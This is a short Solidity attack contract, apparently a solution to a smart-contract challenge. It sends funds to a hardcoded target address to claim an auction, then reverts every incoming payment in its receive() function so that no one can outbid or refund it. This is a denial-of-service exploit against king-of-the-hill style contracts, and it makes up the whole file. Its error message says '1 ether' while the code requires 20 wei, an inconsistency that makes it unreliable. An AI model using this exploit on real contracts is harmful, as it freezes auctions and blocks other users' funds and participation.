pragma solidity ^0.6.0;

contract AuctionAtk {

//target adr: 0xF6ef841Ed4312D17AAc5e9e6039Ee008e893fE51
function attack() external payable {
    require(msg.value == 20 wei, "please send exactly 1 ether");
    address challenge = 0xF6ef841Ed4312D17AAc5e9e6039Ee008e893fE51;
    // claim auction
    // use call here instead of challenge.transfer because transfer
    // has a gas limit and runs out of gas
    (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
    require(success, "External call failed");
}

receive() external payable {
    require(false, "cannot claim auction!");
}

}